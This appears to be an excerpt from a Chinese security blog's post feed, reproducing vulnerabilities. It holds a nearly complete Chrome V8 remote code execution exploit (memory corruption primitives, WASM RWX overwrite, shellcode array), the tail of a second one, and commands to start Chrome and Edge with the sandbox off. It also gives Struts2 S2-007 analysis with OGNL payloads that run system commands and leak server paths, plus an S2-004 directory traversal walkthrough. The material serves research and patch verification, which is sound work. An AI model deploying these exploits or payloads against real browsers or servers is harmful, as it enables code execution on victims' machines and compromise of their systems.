<span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span></span><br><span class="line"><span class="actionscript">        foo(<span class="literal">false</span>);</span></span><br><span class="line">    gc(); gc();</span><br><span class="line"><span class="actionscript">    [corrput_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span></span><br><span class="line">    corrput_arr[12] = 0x22444;</span><br><span class="line"><span class="actionscript">    <span class="keyword">delete</span> corrput_arr;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">setbackingStore</span><span class="params">(hi, low)</span> </span>&#123;</span></span><br><span class="line">        rwarr[4] = i2f(fLow(rwarr[4]), hi);</span><br><span class="line">        rwarr[5] = i2f(low, fHi(rwarr[5]));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">leakObjLow</span><span class="params">(o)</span> </span>&#123;</span></span><br><span class="line">        corrupt_buff.slot = o;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> (fLow(rwarr[<span class="number">9</span>]) - <span class="number">1</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> corrupt_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(corrupt_buff);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> idx0Addr = corrupt_buffer_ptr_low - <span class="number">0x10</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> baseAddr = (corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) - ((corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) % <span class="number">0x40000</span>) + <span class="number">0x40000</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> delta = baseAddr + <span class="number">0x1c</span> - idx0Addr;</span></span><br><span class="line">    if ((delta % 8) == 0) &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> baseIdx = delta / <span class="number">8</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.base = fLow(rwarr[baseIdx]);</span></span><br><span class="line"><span class="actionscript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> baseIdx = ((delta - (delta % <span class="number">8</span>)) / <span class="number">8</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.base = fHi(rwarr[baseIdx]);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> wasmInsAddr = leakObjLow(wasmInstance);</span></span><br><span class="line"><span class="actionscript">    setbackingStore(wasmInsAddr, <span class="keyword">this</span>.base);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> code_entry = corrupt_view.getFloat64(<span class="number">13</span> * <span class="number">8</span>, <span class="literal">true</span>);</span></span><br><span class="line">    setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span></span><br><span class="line">        corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    main();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>关闭浏览器沙箱</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">#退出浏览器进程进行打开</span><br><span class="line">Chrome:</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\A</span>pplication<span class="symbol">\c</span>hrome.exe" -no-sandbox</span><br><span class="line">或</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\A</span>pplication<span class="symbol">\c</span>hrome.exe" --args --no-sandbox</span><br><span class="line"></span><br><span class="line">Edge:</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft<span class="symbol">\E</span>dge<span class="symbol">\A</span>pplication<span class="symbol">\m</span>sedge.exe" -no-sandbox</span><br><span class="line">或</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft<span class="symbol">\E</span>dge<span class="symbol">\A</span>pplication<span class="symbol">\m</span>sedge.exe" --args --no-sandbox</span><br></pre></td></tr></table></figure>

<p><img src="/img/chrome-0day0414/image-20210415114004777.png" alt="image-20210415114004777"></p>
<p>弹出记事本</p>
<p><img src="/img/chrome-0day0414/image-20210415114255029.png" alt="image-20210415114255029"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/avboy1337/1195777-chrome0day" target="_blank" rel="noopener">https://github.com/avboy1337/1195777-chrome0day</a></p>
<p><a href="https://mp.weixin.qq.com/s/gVBsX62O3qaF4JxLsIGI5Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gVBsX62O3qaF4JxLsIGI5Q</a></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome 远程代码执行漏洞</title>
    <url>/2021/06/26/chrome%200day/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>2021年04月13日，发现国外安全研究发布了Chrome 远程代码执行 0Day的POC详情~</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Google Chrome: &lt;=89.0.4389.114</p>
<p>基与chrome内核的其他浏览器</p>
<a id="more"></a>

<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><p>Google Chrome: 89.0.4389.114</p>
<p><img src="/img/chrome%200day/image-20210413161555848.png" alt="image-20210413161555848"></p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>exploit js文件</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">BSD 2-Clause License</span></span><br><span class="line"><span class="comment">Copyright (c) 2021, rajvardhan agarwal</span></span><br><span class="line"><span class="comment">All rights reserved.</span></span><br><span class="line"><span class="comment">Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment">1. Redistributions of source code must retain the above copyright notice, this</span></span><br><span class="line"><span class="comment">   list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment">2. Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment">   this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment">   and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</span></span><br><span class="line"><span class="comment">AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment">IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span></span><br><span class="line"><span class="comment">FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span></span><br><span class="line"><span class="comment">DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line"><span class="comment">SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span></span><br><span class="line"><span class="comment">CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span></span><br><span class="line"><span class="comment">OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span></span><br><span class="line"><span class="comment">OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">var wasm_code = new Uint8Array([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>])</span><br><span class="line">var wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">var f = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(<span class="number">8</span>);</span><br><span class="line">var f64_buf = new Float64Array(buf);</span><br><span class="line">var u64_buf = new Uint32Array(buf);</span><br><span class="line">let buf2 = new ArrayBuffer(<span class="number">0x150</span>);</span><br><span class="line"></span><br><span class="line">function ftoi(val) &#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    return BigInt(u64_buf[<span class="number">0</span>]) + (BigInt(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function itof(val) &#123;</span><br><span class="line">    u64_buf[<span class="number">0</span>] = Number(val &amp; <span class="number">0xffffffff</span>n);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = Number(val &gt;&gt; <span class="number">32</span>n);</span><br><span class="line">    return f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const _arr = new Uint32Array([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"></span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    var x = <span class="number">1</span>;</span><br><span class="line">	x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	x = Math.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = Math.max(x, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	if(x==<span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	var arr = new Array(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	var cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"></span><br><span class="line">	return [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i=<span class="number">0</span>;i&lt;<span class="number">0x3000</span>;++i)</span><br><span class="line">    foo(true);</span><br><span class="line"></span><br><span class="line">var x = foo(false);</span><br><span class="line">var arr = x[<span class="number">0</span>];</span><br><span class="line">var cor = x[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">const idx = <span class="number">6</span>;</span><br><span class="line">arr[idx+<span class="number">10</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line">function addrof(k) &#123;</span><br><span class="line">    arr[idx+<span class="number">1</span>] = k;</span><br><span class="line">    return ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffff</span>n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeobj(k) &#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    return arr[idx+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">var arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line">var fake = fakeobj(addrof(arr2) + <span class="number">0x20</span>n);</span><br><span class="line"></span><br><span class="line">function arbread(addr) &#123;</span><br><span class="line">    if (addr % <span class="number">2</span>n == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1</span>n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2</span>n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">8</span>n);</span><br><span class="line">    return (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arbwrite(addr, val) &#123;</span><br><span class="line">    if (addr % <span class="number">2</span>n == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1</span>n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2</span>n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">8</span>n);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function copy_shellcode(addr, shellcode) &#123;</span><br><span class="line">    let dataview = new DataView(buf2);</span><br><span class="line">    let buf_addr = addrof(buf2);</span><br><span class="line">    let backing_store_addr = buf_addr + <span class="number">0x14</span>n;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    for (let i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + <span class="number">0x68</span>n));</span><br><span class="line">console.log(<span class="string">"[+] Address of rwx page: "</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line">var shellcode = [<span class="number">3833809148</span>,<span class="number">12642544</span>,<span class="number">1363214336</span>,<span class="number">1364348993</span>,<span class="number">3526445142</span>,<span class="number">1384859749</span>,<span class="number">1384859744</span>,<span class="number">1384859672</span>,<span class="number">1921730592</span>,<span class="number">3071232080</span>,<span class="number">827148874</span>,<span class="number">3224455369</span>,<span class="number">2086747308</span>,<span class="number">1092627458</span>,<span class="number">1091422657</span>,<span class="number">3991060737</span>,<span class="number">1213284690</span>,<span class="number">2334151307</span>,<span class="number">21511234</span>,<span class="number">2290125776</span>,<span class="number">1207959552</span>,<span class="number">1735704709</span>,<span class="number">1355809096</span>,<span class="number">1142442123</span>,<span class="number">1226850443</span>,<span class="number">1457770497</span>,<span class="number">1103757128</span>,<span class="number">1216885899</span>,<span class="number">827184641</span>,<span class="number">3224455369</span>,<span class="number">3384885676</span>,<span class="number">3238084877</span>,<span class="number">4051034168</span>,<span class="number">608961356</span>,<span class="number">3510191368</span>,<span class="number">1146673269</span>,<span class="number">1227112587</span>,<span class="number">1097256961</span>,<span class="number">1145572491</span>,<span class="number">1226588299</span>,<span class="number">2336346113</span>,<span class="number">21530628</span>,<span class="number">1096303056</span>,<span class="number">1515806296</span>,<span class="number">1497454657</span>,<span class="number">2202556993</span>,<span class="number">1379999980</span>,<span class="number">1096343807</span>,<span class="number">2336774745</span>,<span class="number">4283951378</span>,<span class="number">1214119935</span>,<span class="number">442</span>,<span class="number">0</span>,<span class="number">2374846464</span>,<span class="number">257</span>,<span class="number">2335291969</span>,<span class="number">3590293359</span>,<span class="number">2729832635</span>,<span class="number">2797224278</span>,<span class="number">4288527765</span>,<span class="number">3296938197</span>,<span class="number">2080783400</span>,<span class="number">3774578698</span>,<span class="number">1203438965</span>,<span class="number">1785688595</span>,<span class="number">2302761216</span>,<span class="number">1674969050</span>,<span class="number">778267745</span>,<span class="number">6649957</span>];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<p>html文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"exploit.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //加载exploit js文件</span><br></pre></td></tr></table></figure>

<p>关闭浏览器沙箱</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">#退出浏览器进程进行打开</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\A</span>pplication<span class="symbol">\c</span>hrome.exe" -no-sandbox</span><br><span class="line">或</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\A</span>pplication<span class="symbol">\c</span>hrome.exe" --args --no-sandbox</span><br></pre></td></tr></table></figure>

<p><img src="/img/chrome%200day/image-20210413160904379.png" alt="image-20210413160904379"></p>
<p>打开exploit.html页面弹出计算器（Edge浏览器同样存在）</p>
<p><img src="/img/chrome%200day/image-20210413160943095.png" alt="image-20210413160943095"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day" target="_blank" rel="noopener">https://github.com/r4j0x00/exploits/tree/master/chrome-0day</a></p>
<p><a href="https://mp.weixin.qq.com/s/dZl_Urk8cOJ1Qbe16HBFGQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dZl_Urk8cOJ1Qbe16HBFGQ</a></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2-007漏洞分析</title>
    <url>/2020/12/28/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成<code>OGNL</code>表达式的执行。</p>
<p>这个漏洞的成因在于，在Struts2中，关于表单我们可以设置每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭合引号导致<code>OGNL</code>的语法解析。</p>
<a id="more"></a>

<p>简易POC</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">'+(#application)+'</span><br></pre></td></tr></table></figure>

<p>在 Struts2 中，可以将 HTTP 请求数据注入到实际业务 Action 的属性中。而这些属性可以是任意类型的数据，通过 HTTP 只能获取到 String 类型数据，所以这里存在类型转换。我们可以通过 xml 文件，来定义转换规则。例如，我这里定义了一个 <code>UserAction</code> 类，其有一个 <code>Integer</code> 类型的 <code>age</code> 属性，这里我们让其数值范围在<code>1-150</code> 。</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201228145655095.png" alt="image-20201228145655095"></p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155539404.png" alt="image-20201225155539404"></p>
<p>如果此时我们将 <code>age</code> 属性值设置成一个字符串，那么就会引发类型转换错误。Struts2 会将用户输入的数据经过处理再次返回给用户。</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155827873.png" alt="image-20201225155827873"></p>
<p>而在这个处理的过程中，就存在 <code>OGNL</code> 表达式注入，我们先在<code>ConversionErrorInterceptor:intercept()</code>方法中打上断点(<code>ConversionErrorInterceptor</code> 类是专门用来处理类型转换失败的拦截器)，当类型出现错误的时候，就会进入这里</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160842454.png" alt="image-20201225160842454"></p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160414486.png" alt="image-20201225160414486"></p>
<p>当发生类型转换错误时，程序会将用户输入的值存入 <code>fakie</code> 变量。在存入之前，会先将值用 <code>getOverrideExpr</code>方法处理，我们跟进该方法。</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161637883.png" alt="image-20201225161637883"></p>
<p>在 <code>getOverrideExpr</code> 方法中，会在用户输入的值两边拼接上单引号，然后再将值存入刚刚的 <code>fakie</code> 变量。这里把我们的payload用单引号阔起来了，这也就解释了为什么我们的payload是形如 <code>&#39; + (*) + &#39;</code>的形式，就是为了逃逸这个单引号。</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161954632.png" alt="image-20201225161954632"></p>
<p>接着程序会把<code>fakie</code> 变量通过<code>setExprOverrides</code>将其放入<code>OgnlValueStack.overrides</code>中</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225162709287.png" alt="image-20201225162709287"></p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225164705641.png" alt="image-20201225164705641"></p>
<p>然后在解析到 Struts2的 <code>/&gt;</code>标签时，会将用户输入值经过<code>OGNL</code> 执行并返回。如果先前 <code>OgnlValueStack.overrides</code>存储过相关字段，则会先从<code>OgnlValueStack.overrides</code> 中取出相关值，然后再通过<code>OGNL</code>执行。</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172127453.png" alt="image-20201225172127453"></p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172048324.png" alt="image-20201225172048324"></p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172537185.png" alt="image-20201225172537185"></p>
<figure class="highlight purebasic"><table><tr><td class="code"><pre><span class="line"># 弹计算器</span><br><span class="line">'+(<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec(<span class="string">"calc"</span>))+'</span><br><span class="line"></span><br><span class="line">'+(<span class="symbol">#_memberAccess</span>[<span class="string">"allowStaticMethodAccess"</span>]=true,<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec(<span class="string">"calc"</span>))+'</span><br><span class="line"></span><br><span class="line"># 获取绝对路径</span><br><span class="line">'+(<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#req</span>=@org.apache.struts2.ServletActionContext@getRequest(),<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(<span class="symbol">#req</span>.getRealPath('/')))+'</span><br><span class="line"></span><br><span class="line">'+(<span class="symbol">#_memberAccess</span>[<span class="string">"allowStaticMethodAccess"</span>]=true,<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#req</span>=@org.apache.struts2.ServletActionContext@getRequest(),<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(<span class="symbol">#req</span>.getRealPath('/')))+'</span><br><span class="line"></span><br><span class="line"># 执行系统命令并回显</span><br><span class="line">'+(<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(new java.util.Scanner(@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec('whoami').getInputStream()).useDelimiter(<span class="string">"\\Z"</span>).next()))+'</span><br><span class="line"></span><br><span class="line">'+(<span class="symbol">#_memberAccess</span>[<span class="string">"allowStaticMethodAccess"</span>]=true,<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(new java.util.Scanner(@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec('whoami').getInputStream()).useDelimiter(<span class="string">"\\Z"</span>).next()))+'</span><br></pre></td></tr></table></figure>



<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172935494.png" alt="image-20201225172935494"></p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>使用 <code>org.apache.commons.lang.StringEscapeUtils.escapeJava()</code>来做了一下escape，防止再从引号里面逃逸出来。</p>
<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225173722361.png" alt="image-20201225173722361"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/7971" target="_blank" rel="noopener">https://xz.aliyun.com/t/7971</a></p>
<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p>
]]></content>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2-004 漏洞分析</title>
    <url>/2020/12/24/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-004" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-004</a></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>攻击者可以使用双重编码的url和相对路径来遍历目录结构并下载“静态”内容文件夹之外的文件。</p>
<a id="more"></a>

<p>根据官方概述，得知漏洞存在的类为 <code>FilterDispatcher</code>过滤器，一般在<code>doFilter</code>方法中进行操作，我们将<code>doFilter</code>进行断点</p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201223101612422.png" alt="image-20201223101612422"></p>
<p>当<code>resourcePath</code>的路径为<code>/struts</code>会调用<code>findStaticResource</code>方法</p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201223102109094.png" alt="image-20201223102109094"></p>
<p>访问的静态文件不能以<code>.class</code> 结尾，其实这个限制没有什么用，然后遍历配置好的静态文件目录并调用 <code>findInputStream</code><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201223103005752.png" alt="image-20201223103005752"></p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201223102453441.png" alt="image-20201223102453441"></p>
<p>将访问的路径跟目录拼接在一起，然后 URL 解码，再调用 <code>getResourceAsStream</code>开始读取文件，就造成了目录遍历漏洞。</p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201223102649847.png" alt="image-20201223102649847"></p>
<p><img src="/img/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201223105441336.png" alt="image-20201223105441336"></p>
